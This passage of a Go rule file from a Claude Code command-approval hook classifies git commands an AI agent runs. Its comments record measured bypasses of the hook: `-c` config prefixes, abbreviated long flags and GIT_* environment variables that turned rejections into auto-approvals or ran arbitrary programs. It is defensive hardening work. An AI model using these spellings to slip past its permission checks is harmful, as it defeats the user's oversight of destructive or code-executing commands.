package git

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/cmdparse"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/patheval"
)

var readOnlySubcommands = map[string]bool{
	// Porcelain inspection
	"log": true, "diff": true, "status": true, "show": true, "blame": true,
	"describe": true, "shortlog": true, "reflog": true, "grep": true,
	"show-branch": true, "whatchanged": true, "range-diff": true,
	// Plumbing: ref/object inspection
	"for-each-ref": true, "ls-files": true, "ls-remote": true, "ls-tree": true,
	"merge-base": true, "rev-list": true, "rev-parse": true, "show-ref": true,
	"name-rev": true, "cat-file": true, "count-objects": true,
	// Plumbing: diff variants
	"diff-tree": true, "diff-index": true, "diff-files": true,
	// Plumbing: verification/integrity
	"verify-commit": true, "verify-tag": true, "verify-pack": true, "fsck": true,
	// Plumbing: gitignore/gitattributes checks
	"check-ignore": true, "check-attr": true, "check-mailmap": true, "check-ref-format": true,
}

// remoteBlockedSubcommands is the `git remote` subcommand set that MUTATES which
// repository a remote name resolves to, or which of its refs are tracked. Every
// member is a hard Reject — see remoteVerdict for the ruling and the rationale.
//
// The set is exactly the operator's enumeration of 2026-07-30, and it is keyed on
// the VERB only — a verb's own flags (`add -f`, `set-url --add`, `set-url --push`)
// do not need listing, since the verb is what remoteVerdict looks up. `prune` and
// `update` are DELIBERATELY absent: they only refresh LOCAL remote-tracking refs
// from the remote a name already points at, so neither can redirect a push, and
// gating them would change verdicts this bead has no ruling for.
var remoteBlockedSubcommands = map[string]bool{
	"add": true, "remove": true, "rm": true, "rename": true,
	"set-url": true, "set-head": true, "set-branches": true,
}

var modifyingSubcommands = map[string]bool{
	"add": true, "commit": true, "branch": true, "fetch": true,
	"push": true, "stash": true, "config": true, "mu": true,
	"mv": true, "rm": true, "cherry-pick": true, "merge": true,
	"worktree": true,
}

type Rule struct {
	// eval gates a `-C <path>` chdir against path-safety zones. When nil (legacy
	// construction) the `-C` path check is skipped and behavior is unchanged.
	eval *patheval.PathEvaluator
}

func New(eval *patheval.PathEvaluator) *Rule {
	return &Rule{eval: eval}
}

// refuse is this rule's ADR 0044 refusal-and-continue return: git OWNS this leaf, has
// examined it, will not clear it, and yet must not stop the chain. It restores the
// Reason ADR 0043 had to demote to a comment at each of these sites.
//
// The restoration is what makes the leaf report as a REFUSAL instead of as a chain
// EXHAUSTION (hookio.Provenance). Without it `git clean -fd` and `git reset --hard`
// were indistinguishable from a basename no rule has ever heard of, so a consumer
// acting on an exhaustion would have cleared them — and these are the destructive
// spellings the rule exists to keep out of an auto-approval.
func (r *Rule) refuse(reason string) (hookio.RuleResult, error) {
	return hookio.Refused(r.Name(), reason)
}

func (r *Rule) Name() string {
	return "git"
}

func (r *Rule) Evaluate(input *hookio.HookInput) (hookio.RuleResult, error) {
	if input.ToolName != "Bash" {
		return hookio.NotApplicable()
	}
	cmdStr, err := input.BashCommand()
	if err != nil {
		return hookio.RuleResult{}, fmt.Errorf("git: read bash command: %w", err)
	}
	parsed := cmdparse.Parse(cmdStr)
	for i, pc := range parsed {
		if !isGitExecutable(pc.Executable) {
			continue
		}
		// THE ENVIRONMENT GIT WILL ACTUALLY SEE, not just this leaf's own prefix
		// (pg2-xjt1s). Computed once and handed to every screen and to classify, so the
		// leaf-local and cross-leaf spellings of one hazard cannot answer differently.
		// See visibleEnvVars for the approach ruling, the measured bash semantics, and
		// the over-approximations.
		envs := visibleEnvVars(input, parsed, i)
		// A pre-subcommand -c / --config-env injects arbitrary git config (e.g.
		// -c core.pager="touch /tmp/pwned") that runs on an otherwise read-only
		// subcommand — a known RCE class. Defer to Claude's prompt. Scoped to the
		// pre-subcommand span so `git commit -c <commit>` (a different flag) and
		// `git -C <path>` are NOT falsely abstained.
		//
		// SINCE pg2-arfw6 THIS IS NO LONGER EVERY `-c`: a pair in the CLOSED
		// clearedConfigFlagPairs allowlist is cleared and falls through to classify,
		// so `git -c core.fsmonitor=false diff` now reaches the same Approve the bare
		// `git diff` gets. That is a RELAXATION and nothing else — see
		// hasGitConfigInjection for the pair-not-key finding, the all-or-nothing rule,
		// and why `--config-env` stays unconditional.
		//
		// IT IS A FLOOR, NOT A REPLACEMENT, SINCE pg2-6f4q9 — AND THAT IS THE WHOLE
		// POINT OF READING IT HERE RATHER THAN ANSWERING HERE. Until this bead the
		// screen was a PRE-CLASSIFY SHORT-CIRCUIT: it returned before the subcommand
		// was classified, so it replaced EVERY verdict with the refusal, decisive ones
		// included. Measured through the real binary on main @ a064a73e, 2026-08-14
		// (scripts/probe-pg2-6f4q9.sh) — each of these is `deny` WITHOUT the `-c`:
		//
		//	git -c user.name=x push --force origin main                 -> {}
		//	git -c user.name=x tag v1                                   -> {}
		//	git -c x=y remote add upstream https://example.invalid/x.git -> {}
		//	git -c x=y config remote.origin.url https://evil.invalid/…   -> {}
		//
		// So prefixing ANY `-c <k>=<v>` — a key with no bearing on the hazard, `user.name`
		// being the extreme case — LAUNDERED a hard Reject into an auto-approvable
		// non-decision. pg2-arfw6 repaired the sliver where the pair CLEARS (the command
		// then reaches classify by construction); every uncleared pair, which is every key
		// outside clearedConfigFlagPairs, still laundered.
		//
		// WHY A FLOOR AND NOT THE SIBLING SCREENS' "DEMOTE AN Approve" SHAPE, WHICH IS
		// WHAT THE BEAD ASKED FOR. Demoting only an Approve is the right answer for a
		// screen whose subject is the ENV PREFIX (hasGitConfigEnvInjection,
		// hasGitProgramEnvVar): those run after classify, and a subcommand classify does
		// not own was already NOT screened by them, so nothing moves. This screen is not
		// in that position — it is the INCUMBENT for every `-c`, including on the
		// subcommands classify answers NotApplicable for. `git -c core.pager=EVIL bisect
		// start` and `git -c core.pager=EVIL clean --help` both measure `{}` today, and
		// `clean --help` is the leaf safecmds APPROVES as a man-page read (see the `clean`
		// arm), so a bare Approve-only demotion would have turned that one into `allow`
		// while git spawns the caller's pager to page the help. A FLOOR is the formulation
		// that is more-restrictive-only in BOTH directions at once:
		//
		//	classify Approve            -> the refusal wins   (unchanged: `{}`)
		//	classify Ask / Reject       -> classify wins      (THE FIX: the decisive verdict survives)
		//	classify NotApplicable      -> the refusal wins   (unchanged: `{}`, and no new `allow`)
		//	classify's own REFUSAL      -> classify wins      (same NoOpinion level, more specific reason)
		//
		// It is hookio.MostRestrictive's rule applied locally, and it has to be local: a
		// rule returns ONE result, and the engine's fold cannot see a verdict this rule
		// discarded. Nothing here upgrades anything — the refusal is a NoOpinion floor, so
		// the screen can only ever leave a verdict alone or lower it.
		//
		// THE VERDICT LEVEL FOR THE Approve CASE IS UNCHANGED (still the ADR 0044 refusal,
		// hence `{}`), so this bead moves NO row that was already non-approving except the
		// decisive ones it restores. pg2-a12rl's and pg2-6c85x's
		// `IsNeverLessRestrictiveThanDashC` relations stay green: they assert env >= argv,
		// and this change RAISES argv on exactly the subcommands where the env route was
		// already the stricter of the two, so the pair converges to equality.
		configFlagInjection := hasGitConfigInjection(pc.Args)
		chdirs, subcmd, rest := cmdparse.GitInvocation(pc.Args)
		if subcmd == "" {
			// No subcommand to classify, so there is no verdict for the floor to sit
			// under: a bare `git -c k=v` keeps the refusal it has always had rather than
			// becoming a leaf no rule examined.
			if configFlagInjection {
				return r.refuse(configFlagInjectionReason)
			}
			return hookio.NotApplicable()
		}
		// classify's own not-applicable (and any genuine failure) propagates
		// UNCHANGED. That is what preserves the pre-ADR-0043 outcome: classify used
		// to answer Abstain and Evaluate returned it, so the chain continued. It also
		// SKIPS the chdir demotion below, correctly — that demotion only ever
		// demotes an Approve, and there is no Approve to demote here.
		res, err := r.classify(pc, envs, subcmd, rest)
		if err != nil {
			// `res` is forwarded WITH the error since ADR 0044: classify's error may be
			// a REFUSAL whose RuleResult is the floor, and dropping it would report
			// `git clean -fd` / `git reset --hard` as a leaf NO rule examined. For a
			// not-applicable or a genuine failure `res` is the zero value, so the
			// pre-ADR-0044 `return RuleResult{}, err` is unchanged for both.
			//
			// THE `-c` FLOOR APPLIES HERE TOO, and only in the not-applicable case
			// (pg2-6f4q9). classify's own REFUSAL is already a NoOpinion floor — the same
			// level this screen contributes — so it keeps its more specific reason (`git
			// clean` says why it is a clean). A NOT-APPLICABLE contributes nothing, so
			// without this branch a `-c` would go UNSCREENED on every subcommand this rule
			// does not classify, and `git -c core.pager=EVIL clean --help` would reach the
			// safecmds man-page Approve. errors.Is distinguishes the two despite ErrRefused
			// deliberately matching ErrNotApplicable in the other direction (hookio's
			// refusalError.Is), so the test must be against ErrRefused, never against
			// ErrNotApplicable.
			if configFlagInjection && !errors.Is(err, hookio.ErrRefused) {
				return r.refuse(configFlagInjectionReason)
			}
			return res, err
		}
		// The `-c` floor's Approve arm. Written as a sibling of the env demotions below
		// rather than fused with them because it rests on its own ruling and its own
		// measurement — see the call-site comment above hasGitConfigInjection's read.
		if res.Decision == hookio.Approve && configFlagInjection {
			return r.refuse(configFlagInjectionReason)
		}
		// THE ENV SPELLING OF THE `-c` INJECTION ABOVE (pg2-a12rl). A
		// `GIT_CONFIG_*` assignment on this leaf hands git configuration of the
		// caller's choosing — including every configSink key gatedConfigKeys names
		// — so an otherwise-approvable command may execute a program named in that
		// prefix. Withdraw the approval and let the chain continue, which lands the
		// leaf on the SAME `{}` the `-c` route reaches. See hasGitConfigEnvInjection
		// for the measured variable-by-variable evidence and for why it is key-blind.
		//
		// IT IS A DEMOTION OF AN Approve, AND SO — SINCE pg2-6f4q9 — IS THE `-c` GUARD's
		// OWN Approve ARM. When pg2-a12rl wrote this screen the `-c` route answered BEFORE
		// classify and replaced every verdict, including the decisive ones: measured
		// through the real binary, this worktree, 2026-08-13, `git -c user.name=x tag v1`
		// and `git -c user.name=x push --force origin main` each emitted `{}` while the
		// same commands WITHOUT the `-c` are `deny`. This screen deliberately did NOT copy
		// that shape, and pg2-6f4q9 has since removed it from the `-c` route as well — see
		// the `configFlagInjection` floor above for the ruling and why that route needed a
		// FLOOR rather than this Approve-only demotion.
		//
		// THE DEMOTION SHAPE IS STILL THE POINT HERE, NOT AN ARTEFACT OF THAT HISTORY.
		// This screen's subject is the leaf's ENV PREFIX, so gating only an Approve leaves
		// `git tag`, force-push and the redirect-class config Rejects exactly as they were,
		// which the same measurement confirms. A future edit MUST NOT widen it to answer
		// before classify.
		//
		// Order against the chdir demotion below does not matter — both withdraw the
		// same Approve and return the same not-applicable.
		if res.Decision == hookio.Approve && hasGitConfigEnvInjection(envs) {
			return r.refuse("git: a GIT_CONFIG_* env assignment injects config; deferring to prompt")
		}
		// THE ENV SPELLING THAT SKIPS THE CONFIG KEY ENTIRELY (pg2-6c85x). The block
		// above screens the variables that hand git CONFIGURATION; these hand it the
		// PROGRAM, with no key in between — `GIT_EXTERNAL_DIFF` and `GIT_SSH_COMMAND` are
		// `diff.external` and `core.sshCommand` by another name, both MEASURED running a
		// marker program on git 2.54.0 (scripts/probe-pg2-6c85x.sh). So the argv route
		// `git -c diff.external=<prog> diff` was deferred while the env route was
		// APPROVED: the same inconsistency pg2-a12rl closed, one level down. See
		// gitProgramEnvVars for the per-variable evidence, for why the match is
		// value-blind outside the editor family (pg2-6qh3p's carve-out), and for the
		// variable that stays deliberately declined.
		//
		// IT IS A SEPARATE DEMOTION RATHER THAN A CLAUSE ADDED TO THE ONE ABOVE because
		// the two screens rest on different measurements and different rulings; fusing
		// them would leave one rationale comment covering two independent boundaries. Both
		// are DEMOTIONS OF AN Approve, never a pre-classify short-circuit: that shape was
		// measured turning `git tag` and a force-push from `deny` into an auto-approvable
		// `{}`, which is why pg2-6c85x declined to copy it and why pg2-6f4q9 has since
		// taken it off the `-c` route too. Gating only an Approve leaves every decisive
		// verdict in this file exactly as it was.
		//
		// Order against the sibling demotions does not matter — all withdraw the same
		// Approve and return the same not-applicable.
		if res.Decision == hookio.Approve && hasGitProgramEnvVar(envs) {
			return r.refuse("git: a GIT_* env assignment names the program git will execute; deferring to prompt")
		}
		// THE INTERLOCK SIBLING (pg2-nd6i3). Same shape and same reasoning as the demotion
		// above, one hazard class over: the variable names no program, it REMOVES A REFUSAL
		// GIT MAKES BY DEFAULT. `GIT_ALLOW_PROTOCOL` and `GIT_PROTOCOL_FROM_USER` both
		// MEASURED running a marker as `git-upload-pack` through the `ext::` transport,
		// which is arbitrary command execution, while the `-c` and `git config` spellings of
		// the same interlock were already screened — so the env spelling was the loosest of
		// the three. See gitInterlockEnvVars for the per-variable evidence and the
		// enumeration.
		//
		// A SEPARATE DEMOTION, for the reason the comment above gives for its own
		// separateness: the two rest on different measurements and different tables, and
		// fusing them would leave one rationale covering two independent boundaries.
		if res.Decision == hookio.Approve && hasGitInterlockEnvVar(envs) {
			return r.refuse("git: a GIT_* env assignment removes a refusal git makes by default; deferring to prompt")
		}
		// A `-C <path>` chdir runs the subcommand against a directory other than
		// the invocation CWD. When the rule would otherwise Approve, withdraw the
		// approval if that directory is unsafe for the subcommand's access class:
		// a read-only subcommand needs the dir to be readable, a modifying one
		// needs it writable. The chain then continues and most-restrictive
		// aggregation defers to the prompt (never a hard Reject — the check uses
		// CanRead/CanWrite, not IsDeny*) instead of auto-approving a write into an
		// unknown zone (pg2-b3eow). Gated to a non-empty -C so a bare git command
		// keeps its verdict regardless of the CWD's zone.
		if res.Decision == hookio.Approve && !r.chdirSafe(input.CWD, chdirs, subcmd) {
			return r.refuse("git: -C target directory is unsafe for a " + subcmd + " (deferred to claude-code)")
		}
		return res, nil
	}
	return hookio.NotApplicable()
}

// classify returns the base verdict for a git subcommand, independent of any
// `-C` path-safety concern (which Evaluate layers on top via chdirSafe).
//
// BARE-INDEX OPERAND SURVEY, 2026-07-30 (pg2-8imjo). Every arm below was checked
// for an operand read by a fixed argument index — the defect class where a leading
// flag displaces the token a gate keys on. Result: NONE REMAIN in this file. The
// `git remote` arm's `rest[0]` was the only one and is now
// cmdparse.FirstOperand(rest) in remoteVerdict; `subcmd` itself comes from
// cmdparse.GitInvocation, which already consumes pre-subcommand options; and every
// other arm keys on a FLAG (hasFlag, cmdparse.HasShortFlag/HasLongFlag) or on a
// classified refspec, never on a position. A NEW arm MUST use FirstOperand rather
// than an index.
//
// `git config` was the second arm of that survey and is now closed the same way
// (pg2-szadj): it was in modifyingSubcommands and approved OUTRIGHT, with no key
// lookup at all, so any key could be written with no prompt. configVerdict below
// locates the key with cmdparse.Operands — the whole-list form of FirstOperand —
// because `--global` and `--type=bool` shift the key's position and a separated
// `-f <file>` shifts it again. See that function for why a position-free scan is
// required rather than a single FirstOperand read.
//
// LONG-FLAG ABBREVIATION SURVEY, 2026-07-30 (pg2-os1kq). The bare-index survey
// above records that every arm keys on a FLAG rather than a position — which moved
// the same defect one axis over. git's parse-options accepts any UNAMBIGUOUS PREFIX
// of a long option, so an EXACT-TOKEN long-flag test is bypassable by shortening the
// flag by one character, and the bypass direction is toward Approve. Measured
// `allow` on a binary built from main @ 9c52f66b: `git reset --har HEAD~1`, `--ha`,
// `--h` (all three PERFORM the hard reset) and `git rebase --interactiv`, `--intera`,
// `--int`, `--in`. Every long-flag test in this file now goes through
// cmdparse.HasLongFlagPrefix or hasAbbrevLongFlag; see hasAbbrevLongFlag for the
// rule that decides which, and flagmatch_test.go for the AST guard that enforces it.
//
// `git branch` FORCE-DELETE was the third arm, folded in by pg2-os1kq's widening of
// 2026-07-30. `isDestructive` tested `a == "-D"` by exact token, which missed the
// clustered shorts `-Df` / `-fD` AND the long-form equivalent `--delete --force` —
// the latter not an abbreviation at all, but `-D` spelled out, which no short-flag
// matching can find. All four measured `allow` while really deleting an unmerged
// branch.
//
// THAT ARM IS NOW SUPERSEDED, AND SO IS `isDestructive` ITSELF (pg2-fkmg4,
// 2026-07-31 operator ruling). `-D` was never the real surface: the force-DELETE
// conjunction left `-M`, `-C` and a bare `-f` approved. `-M` and `-C` were MEASURED
// clobbering an existing branch the caller did not name, and `-f` is git's own
// documented force CREATION, which silently MOVES an existing ref. The ruling replaces
// flag-by-flag classification with git's own safe/unsafe boundary, and the verdict
// LEVEL moves from Ask to Abstain — so the shared "destructive git command" Ask site
// that `isDestructive` fed had exactly one caller left and is gone with it. `git
// branch` now has its own arm below, and isBranchUnsafe holds the whole policy: the
// guarded-vs-unguarded principle, the accepted auto-mode consequence, and the
// `--no-` negation trap.
//
// ONE ADJACENT GAP IS DELIBERATELY LEFT ALONE:
//
//   - `hasGitConfigInjection`'s exact-token `--config-env` / `--git-dir` /
//     `--work-tree` / `--namespace` — those are PRE-SUBCOMMAND options, parsed by
//     git's own `handle_options()` rather than by parse-options, and it accepts NO
//     abbreviation. Measured on git 2.54.0, 2026-07-30: `git --git-di=<dir> log`,
//     `git --git=<dir> log`, `git --work-tre=<dir> log`, `git --namespac=<ns> log`
//     and `git --config-en=X=Y log` each answered `unknown option: …`, while every
//     full spelling worked. So the exact-token test IS git's own parse there, and
//     prefix-matching them would over-match with no bypass to close.
func (r *Rule) classify(pc cmdparse.ParsedCommand, envs []cmdparse.EnvAssignment, subcmd string, rest []string) (hookio.RuleResult, error) {
	// push: the force / remote-ref-destroying spellings (pg2-bohpm) and a NETWORK
	// destination given in place of a remote name (pg2-abb65) are REJECTED — see
	// pushVerdict for both rulings and their rationale. Every other push falls
	// through to the modifying-subcommand Approve below, so ordinary pushes, pushes
	// to a LOCAL PATH, and same-branch --force-with-lease keep their verdict.
	if subcmd == "push" {
		if res, ok := r.pushVerdict(rest); ok {
			return res, nil
		}
	}
	// branch: THE VERDICT IS BY SAFETY, NOT BY FLAG (operator ruling pg2-4yy4r item 5,
	// implemented by pg2-fkmg4). A spelling from which GIT'S OWN GUARD has been removed
	// Abstains; every spelling where that guard still stands keeps its Approve by
	// FALLING THROUGH to modifyingSubcommands["branch"] below. Falling through rather
	// than answering here is deliberate: it is what keeps the redirected-context Ask
	// (`GIT_DIR=/other git branch -d foo`) and the `-C <path>` chdir demotion applying
	// to a safe `git branch` exactly as they did before. See isBranchUnsafe.
	if subcmd == "branch" && isBranchUnsafe(rest) {
		return r.refuse("git: git branch with git's own guard removed (-D/-M/-C, or an explicit -f/--force); deferring to prompt")
	}
	if readOnlySubcommands[subcmd] {
		return hookio.RuleResult{
			Decision: hookio.Approve,
			Reason:   "read-only git command",
			Module:   r.Name(),
		}, nil
	}
	if subcmd == "checkout" {
		if hasRedirectEnvVar(envs) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "git command with redirected context", Module: r.Name()}, nil
		}
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "git checkout", Module: r.Name()}, nil
	}
	// rebase: approve unless interactive without automated editor.
	//
	// The long flag is matched by PREFIX (pg2-os1kq): the exact-token test missed
	// `--interactiv`, `--intera`, `--inte`, `--int` and `--in`, all measured PARSED
	// by git 2.54.0 on 2026-07-30 (`--i` alone is `ambiguous option: i`), so an
	// interactive rebase could skip the editor requirement and hang on a prompt no
	// one can answer.
	//
	// `-i` STAYS AN EXACT-TOKEN SHORT TEST, deliberately. Widening it to
	// cmdparse.HasShortFlag would scan clusters, and `git rebase` has value-taking
	// shorts whose GLUED value contains `i` (`-Xignore-all-space`), which would
	// manufacture a false editor requirement — the arity problem HasShortFlag
	// documents and pushes to its caller. A clustered `-qi` is therefore still
	// missed; that is a SHORT-flag gap, not this bead's abbreviation class, and
	// closing it needs its own measured ruling.
	if subcmd == "rebase" {
		if hasFlag(rest, "-i") || cmdparse.HasLongFlagPrefix(rest, "interactive") {
			if !hasSequenceEditorEnvVar(pc) {
				return r.refuse("git rebase -i requires editor")
			}
		}
		if hasRedirectEnvVar(envs) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "git command with redirected context", Module: r.Name()}, nil
		}
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "modifying git command", Module: r.Name()}, nil
	}
	// filter-branch: approve (history rewriting used by agents for commit cleanup)
	if subcmd == "filter-branch" {
		if hasRedirectEnvVar(envs) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "git command with redirected context", Module: r.Name()}, nil
		}
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "modifying git command", Module: r.Name()}, nil
	}
	// tag: always reject — tags cause confusion in this workflow
	if subcmd == "tag" {
		return hookio.RuleResult{Decision: hookio.Reject, Reason: "git: git tag is prohibited — tags cause confusion in this workflow", Module: r.Name()}, nil
	}
	// remote: a MUTATION is Reject, a read-only inspection stays Approve — see
	// remoteVerdict for the ruling and the flag-displacement defect it closes.
	if subcmd == "remote" {
		return r.remoteVerdict(rest), nil
	}
	// config: a WRITE to a key that disables a safety interlock, points git at a
	// program of the caller's choosing, or repoints a remote is gated; a READ and
	// every ordinary write keep their Approve — see configVerdict for the key-by-key
	// ruling and the invariant each verdict rests on.
	if subcmd == "config" {
		return r.configVerdict(envs, rest), nil
	}
	// modifying: approve (includes tag, mv, rm, worktree, etc.)
	if modifyingSubcommands[subcmd] {
		if hasRedirectEnvVar(envs) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "git command with redirected context", Module: r.Name()}, nil
		}
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "modifying git command", Module: r.Name()}, nil
	}
	// reset: approve unless --hard, IN ANY SPELLING GIT ACCEPTS.
	//
	// THIS WAS THE SEVERE HALF OF pg2-os1kq. The test was an exact-token
	// `hasFlag(rest, "--hard")`, so `--har`, `--ha` and `--h` — measured on git
	// 2.54.0, 2026-07-30, to each PERFORM the hard reset — fell through to the
	// Approve below, whose reason ASSERTS the reset is soft. A hard reset was not
	// merely approved: it was approved with a message telling every later reader of
	// the log that the working tree was safe. cmdparse.HasLongFlagPrefix matches
	// every abbreviation without an enumeration to keep in step with git; its doc
	// records why over-matching is the fail-safe direction here.
	//
	// `--hard` IS AN ABSTAIN, NOT AN ASK (pg2-ur9zc). Operator ruling, pg2-4yy4r
	// item 4, 2026-07-30: an ordinary `git reset --hard` MUST NOT be prompted by
	// this rule. ONE verdict changed; the classification is otherwise untouched, and
	// the abbreviation coverage above is unchanged — it now decides who receives the
	// non-decision rather than who receives a prompt.
	//
	// WHY ABSTAIN AND NOT THE ADJACENT ASK. Ask means "a person is wanted", and the
	// operator has already answered that question for this command. Approve is the
	// wrong other direction: it would ASSERT the working tree is safe, which is the
	// exact false claim pg2-os1kq closed. Abstain is the only verdict that neither
	// prompts nor asserts safety — it hands the decision back to claude-code. See
	// `docs/adr/0043-ceta-rule-verdict-vocabulary.md`'s "Why the missing verdict
	// costs prompts", where `git: reset --hard` is 10 of the 268 replayed asks.
	//
	// THE CONSEQUENCE THE OPERATOR EXPLICITLY ACCEPTED. hookio.FormatOutput maps
	// Abstain to the empty object `{}`, which hands the decision to claude-code in
	// its documented order — auto-approve mode, then settings pre-authorization,
	// then the prompt (ADR 0043's Decision). So in `default` permission mode
	// `git reset --hard` still prompts, and in `auto` mode it RUNS UNPROMPTED. The
	// ruling accepted that. The operator's `git clean` ruling has the same shape but
	// is a SEPARATE bead (pg2-u0e0c) and is NOT landed: the clean arm below is still
	// a decisive Ask, and this arm is not authority to change it.
	//
	// THE ABSTAIN REALLY REACHES `{}` — IT IS NOT RE-APPROVED DOWNSTREAM, WHICH IS
	// THE ONLY SAFETY QUESTION LEFT. `git` appears in the safecmds tables only in
	// hasSubcommands, which covers `git <sub> --help` and `git help <sub>` and
	// nothing else; it is absent from alwaysSafe, safeReadCmds and safeWriteCmds, so
	// no later member of setup.RuleChain approves a `git` leaf. THE PROBE that
	// establishes it is scripts/probe-pg2-ur9zc.sh — it builds the binary from the
	// current worktree with XDG_DATA_HOME redirected away from real state and prints
	// the RAW emitted output, because a decision-only reading cannot tell `{}` from
	// a missing key. Measured 2026-08-12: `git reset --hard`,
	// `git reset --hard HEAD~1`, `git reset --hard origin/main`,
	// `git reset --har HEAD~1` and the compound `git reset --hard && echo ok` each
	// emitted `{}`. The compound holds because Abstain outranks Approve in the
	// hookio.MostRestrictive fold (pg2-t4uyx), so the trailing `echo` cannot lift
	// the expression to `allow`. Corroborated by two leaves that ALREADY fall through
	// this rule's terminal Abstain — `git bisect start` and `git notes list` — which
	// ADR 0043's Consequences records emitting `{}` for this same reason.
	//
	// ASSERTING THE Decision ALONE IS INSUFFICIENT and MUST NOT be the only
	// coverage: a rule-level Abstain cannot see a later rule re-approving the leaf.
	// The boundary assertions live in cmd/claude-extended-tool-approver/main_test.go
	// (TestIntegration_GitResetHard_EmitsEmptyObject and its compound sibling),
	// which run the real binary and require the emitted output to be `{}` and NOT
	// `permissionDecision: "allow"`.
	//
	// ONE THING ADR 0043 ASKS FOR THAT THIS DOES NOT SATISFY, recorded rather than
	// glossed. Its Decision requires, for an Ask -> non-decisive conversion, that
	// removing the rule from the chain be shown to make the leaf reach `allow`. This
	// leaf does NOT: it reaches `{}`, per the probe above. That demonstration exists
	// to tell a Shape-A blocking Ask apart from an Ask that genuinely wants a human,
	// and the operator ruling answers the second question directly. ADR 0043's
	// Consequences carves this case out by name — the `git`- and `gh`-family rulings
	// "MUST NOT be sequenced behind this ADR", precisely because a plain
	// non-decisive verdict already reaches `{}` — so no `Defer`/`NoOpinion` level
	// (pg2-744af) is a prerequisite here.
	if subcmd == "reset" {
		// THE REDIRECT TEST RUNS FIRST, AND THE ORDER IS LOAD-BEARING SINCE
		// pg2-ur9zc. Before it, both branches returned Ask and their order was
		// invisible. Testing `--hard` first now would hand a redirected-context HARD
		// reset the WEAKER verdict — Abstain, hence `{}` and auto-approvable — while
		// a redirected-context SOFT reset kept its always-prompting Ask: the strictly
		// more dangerous command answered strictly more permissively. Keeping the
		// redirect test first preserves the Ask for EVERY reset spelling under a
		// GIT_DIR / GIT_WORK_TREE redirect (the verdict TestGit_GitDirModifying_Ask
		// pins) and confines the operator's ruling to the ordinary, non-redirected
		// invocation it was actually about. A future edit MUST NOT swap these two.
		//
		//	redirected context, any reset spelling  -> Ask      (unchanged)
		//	--hard, any abbreviation, no redirect   -> Abstain  (the ruling)
		//	soft / mixed / keep / merge, no redirect -> Approve (unchanged)
		if hasRedirectEnvVar(envs) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "git command with redirected context", Module: r.Name()}, nil
		}
		if cmdparse.HasLongFlagPrefix(rest, "hard") {
			return r.refuse("git:destructive: git reset --hard is destructive — not prompted by this rule per operator ruling 2026-07-30, " +
				"deferred to claude-code (auto-approve mode, then settings, then the prompt)")
		}
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "git:modifying: git reset (soft) is safe", Module: r.Name()}, nil
	}
	// clean: ABSTAIN, IN EVERY SPELLING, WITH NO FLAG INSPECTION AT ALL — operator
	// ruling 2026-07-30, recorded as pg2-4yy4r item 3 and implemented by pg2-u0e0c.
	// The flag-aware row design that would have split this arm is REJECTED, not
	// deferred.
	//
	// WHY ABSTAIN AND NOT THE ADJACENT Ask. `git reset --hard`, one arm up, answers
	// Ask, and so did this arm until the ruling. An Ask poses a QUESTION; the ruling is
	// that this rule has no answer to add for `git clean` and the verdict belongs to
	// Claude Code, which already has three layers for it — an auto-approving mode,
	// then the settings pre-authorization, then the prompt. Abstain emits `{}`
	// (hookio.FormatOutput), and `{}` is what hands it over.
	//
	// THE CONSEQUENCE THE OPERATOR ACCEPTED, AND IT MUST NOT BE RE-LITIGATED HERE.
	// `{}` means `git clean -fdx` still PROMPTS in `default` mode but is AUTO-APPROVED,
	// unprompted, in an auto-approving mode. That was raised explicitly — the deletion
	// of untracked files is irreversible and can take uncommitted work and un-ignored
	// `.env` files with it, and it leaves this arm LESS strict than a force-push
	// (Reject) or `reset --hard` (Ask) — and the ruling was REAFFIRMED against it.
	// Raising this back to Ask, or up to Reject, needs a NEW ruling and its own bead.
	//
	// `-n` / `--dry-run` ARE ABSTAIN TOO, NOT Approve, and that is equally deliberate:
	// the provably-safe read-only spellings were NOT carved out, so a dry run prompts in
	// `default` mode. Carving them out would reintroduce the very flag test this arm
	// exists in order not to have.
	//
	// WHY ONE UNIFORM VERDICT IS A STRICT SIMPLIFICATION AND NOT A WEAKENING. The
	// design it replaces (Approve a no-force / `-n` / `--dry-run` clean, Abstain
	// `-f…`) was refuted because THE FLAG TEST IS THE BUG SURFACE, in two independent
	// ways:
	//
	//   - `-fdx` is a SINGLE token, so an exact-token `-f` test sorts the MOST
	//     destructive spelling into the "no force given" branch and APPROVES it.
	//   - git's parse-options accepts any UNAMBIGUOUS PREFIX of a long option, so
	//     `--force` is also `--forc`, `--for`, `--fo` and `--f`. cmdparse.HasLongFlag
	//     documents that it covers no abbreviation and that a caller needing them
	//     "MUST NOT enumerate spellings by hand — that is how one gets missed", which
	//     is the defect pg2-os1kq closed for `reset --hard` and `rebase -i`. Every
	//     spelling a matcher misses is a silent misclassification, and the miss
	//     direction is toward Approve.
	//
	// A verdict with no flag test can have neither defect. SO DO NOT ADD ONE: a diff
	// that inspects a `clean` flag contradicts the ruling whichever way it then decides.
	// This is also why `git branch`'s safe/unsafe principle was NOT widened to here —
	// isBranchUnsafe reads flags, and pg2-fkmg4 scoped itself to `branch` saying so.
	//
	// THE `clean.requireForce` INTERLOCK IS GATED ELSEWHERE NOW, which closes the half
	// of pg2-szadj that used to live in this comment. A prior `git config
	// clean.requireForce false` removes git's own refusal to delete untracked files
	// without an explicit force flag; while this arm posed a QUESTION, that write could
	// leave the operator answering under a belief that was no longer true. configVerdict
	// gates the write (measured 2026-07-31 against main @ 9c52f66b: `git config
	// clean.requireForce false` and its `--global` form both answer Ask), and this arm
	// now poses no question of its own, so the two-step concern is closed from both ends.
	//
	// MEASURED, this worktree, 2026-08-12, via scripts/probe-pg2-u0e0c.sh: every
	// spelling in the acceptance criteria — bare, `-n`, `--dry-run`, `-f`, `-fdx`,
	// `-df`, `--force`, `--forc`, `--for`, `--fo`, `--f` — emits `{}`, and so does the
